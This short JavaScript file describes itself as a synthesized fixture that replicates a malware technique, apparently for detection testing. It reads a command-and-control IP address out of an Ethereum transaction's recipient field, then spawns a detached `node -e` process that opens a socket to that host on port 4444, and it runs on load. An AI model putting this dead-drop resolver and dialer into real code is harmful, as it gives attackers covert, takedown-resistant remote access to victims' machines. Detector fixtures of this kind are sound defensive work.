// Synthesized dead-drop staging fixture: resolves its C2 endpoint from an
// Ethereum blank-transfer recipient, then stages a raw-socket dialer through
// a freshly spawned `node -e` evaluator. Technique replica for the
// deaddrop-staged-node-eval-socket composite, not any collected sample.
const RPCS = ['https://rpc.example.invalid', 'https://eth.example.invalid'];
const OPERATOR = '0x' + 'ab'.repeat(20);

async function post(url, method, params) {
  const r = await fetch(url, { method: 'POST', body: JSON.stringify({ jsonrpc: '2.0', id: 7, method, params }) });
  return (await r.json()).result;
}

async function settle() {
  for (const url of RPCS) {
    const tip = await post(url, 'eth_blockNumber', []);
    const block = await post(url, 'eth_getBlockByNumber', [tip, true]);
    for (const tx of block.transactions) {
      if (tx.from.toLowerCase() !== OPERATOR) continue;
      if (tx.value !== '0x0') continue;
      if (tx.input !== '0x') continue;
      const recipient = tx.to;
      const addressBytes = Buffer.from(recipient.slice(2), 'hex');
      const primary = addressBytes.subarray(0, 4);
      const secondary = addressBytes.subarray(4, 8);
      const host = Array.from(primary).flatMap((x) => [x]).join('.');
      const _tail = Array.from(secondary).map((x) => x).join('.');
      const { spawn } = require('child_process');
      spawn('node', ['-e', `require('net').connect(4444,'${host}')`], { detached: true });
      return { host };
    }
  }
  return null;
}

settle();
